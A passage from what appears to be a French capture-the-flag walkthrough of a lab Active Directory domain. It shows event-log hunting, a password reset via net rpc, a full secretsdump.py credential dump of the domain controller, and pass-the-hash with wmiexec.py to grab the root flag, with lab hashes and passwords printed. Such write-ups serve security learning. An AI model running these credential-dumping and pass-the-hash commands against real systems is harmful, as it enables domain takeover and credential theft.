APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES                                                           Allow        True             None                                 ReadKey
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES                                                           Allow        True      InheritOnly                             -2147483648
S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681             Allow        True             None                                 ReadKey
S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681             Allow        True      InheritOnly                             -2147483648
```

Ah ! Il n'est pas question de `DNSADMINS` ici et je n'ai pas de droits sur le groupe `Server Operators`. La poisse !

Sans conviction, je me suis dirigé vers le groupe `EVENT LOG READERS` et cherché des erreurs de connexion dans les logs, des fois que quelqu'un rentre son mot de passe dans le champ prévu pour le nom d'utilisateur :

```console
$ *Evil-WinRM* PS C:\Program Files (x86)> Get-WinEvent -LogName Security -ErrorAction SilentlyContinue | Where-Object {
    # First, filter by Event ID
    $_.Id -eq 4625 -and
    # Then, filter by message content for the specific sub status or failure reason
    ($_.Message -like "*Sub Status: 0xC0000064*" -or $_.Message -like "*Unknown user name or bad password*")
} | Select-Object -Property TimeCreated,Id,LevelDisplayName,@{Name='AccountName';Expression={$_.Properties[5].Value}},@{Name='FailureReason';Expression={$_.Properties[8].Value}},@{Name='Status';Expression={$_.Properties[9].Value}},@{Name='SubStatus';Expression={$_.Properties[10].Value}},Message | Format-Table -AutoSize

TimeCreated             Id LevelDisplayName AccountName                FailureReason      Status SubStatus Message
-----------             -- ---------------- -----------                -------------      ------ --------- -------
6/19/2025 4:36:44 PM  4625 Information      SOUPEDECODE.LOCAL/XKATE578 %%2313        -1073741724         3 An account failed to log on....
6/18/2025 5:53:05 PM  4625 Information      charlie                    %%2313        -1073741718         3 An account failed to log on....
6/18/2025 5:25:34 PM  4625 Information      charlie                    %%2313        -1073741718         3 An account failed to log on....
6/18/2025 5:21:57 PM  4625 Information      charlie                    %%2313        -1073741718         3 An account failed to log on....
6/18/2025 5:21:50 PM  4625 Information      charlie                    %%2313        -1073741718         3 An account failed to log on....
6/18/2025 5:21:31 PM  4625 Information      charlie                    %%2313        -1073741718         3 An account failed to log on....
6/18/2025 5:18:42 PM  4625 Information      guest                      %%2313        -1073741718         3 An account failed to log on....
7/31/2024 10:59:02 PM 4625 Information      administrator              %%2313        -1073741724         3 An account failed to log on....
7/31/2024 10:59:02 PM 4625 Information      administrator              %%2313        -1073741724         3 An account failed to log on....
7/31/2024 10:59:01 PM 4625 Information      administrator              %%2313        -1073741724         3 An account failed to log on....
--- snip ---
6/15/2024 11:45:54 AM 4625 Information      Administrator              %%2313        -1073741718         3 An account failed to log on....
6/15/2024 11:45:44 AM 4625 Information      Administrator              %%2313        -1073741718         3 An account failed to log on....
6/15/2024 11:45:34 AM 4625 Information      Administrator              %%2313        -1073741718         3 An account failed to log on....
6/15/2024 11:45:34 AM 4625 Information      Administrator              %%2313        -1073741718         3 An account failed to log on....
6/15/2024 11:29:53 AM 4625 Information      Administrator              %%2313        -1073741718         2 An account failed to log on....
```

Nope !

### You must be kidding

La solution finalement consistait à supprimer la VM et à l'importer une nouvelle fois. Cette fois le changement du mot de passe de `fbeth103` marchait très bien :

```console
$ net rpc password fbeth103 -U SOUPEDECODE.LOCAL/xkate578%jesuschrist -S 192.168.56.117
Enter new password for fbeth103:
```

La raison du blocage m'est totalement inconnu. De même, pourquoi ça fonctionne, reste assez obscur pour moi.

A priori `fbeth103` fait partie du groupe `Operators` qui fait partie du groupe des administrateurs et comme cette appartenance n'est pas directe, alors on peut changer le mot de passe grâce à notre appartenance à `acounts operator`.

Cela n'empêche pas que d'après BloodHound, je n'avais pas de `GenericAll` dessus et d'ailleurs, il ne trouve aucun chemin entre  `xkate578` et `Operators`. La preuve que Windows, c'est complexe.

Dans tous les cas, une fois le mot de passe changé, on peut utiliser ce compte admin pour dumper les hashs :

```console
$ secretsdump.py SOUPEDECODE.LOCAL/fbeth103:hellothere@192.168.56.117
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SOUPEDECODE\DC01$:aes256-cts-hmac-sha1-96:7dd1acdd3ada9367c1e9dee753deb4b1fdec59c97f5680191e2200c96a0e7daa
SOUPEDECODE\DC01$:aes128-cts-hmac-sha1-96:ed9dd09705dc0ff7040a307f4e00450a
SOUPEDECODE\DC01$:des-cbc-md5:15aec7f15e5e98fd
SOUPEDECODE\DC01$:plain_password_hex:b3b81e9e1c11a0b48f633487cfcd0739d4d662b1957d23beb277ca44c50865acf9d12ef28624068067237d4c2c36a282e3228eab9ef32a0c4b55c4b3237f4451f9f7067344576cf7d7cd3f2a7c80b949a2940295eee1c89721d14a25ba0c7590781efa4015c38ac5ca08cc42499a17f82faf2c6ff47ba29fabef92b768e33484ea031bc14740a5dceb345e39089470da4e17e0bcd8ede6b2405474e2a4d4e498f139f925c929afd9deb5b15589e521a03e19735af627bba238bd7298322231eb6eed795e94647a687fa18adac91ac7de7e510a395958c37335fe8f873aab114174284b260ac0ad9ab84afd9f0dd92725
SOUPEDECODE\DC01$:aad3b435b51404eeaad3b435b51404ee:87ff5e1a6fee88bbfc311971775168bd:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14:::
--- snip ---
```

Et avec le hash de l'admin du domaine, on peut se connecter au contrôleur et chopper le flag final :

```console
$ wmiexec.py -hashes :2176416a80e4f62804f101d3a55d6c93 'SOUPEDECODE.LOCAL/Administrator'@192.168.56.117
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd users\administrator\desktop
C:\users\administrator\desktop>type root.txt
b8e59a7d4020792c412da75e589ff4fc
```


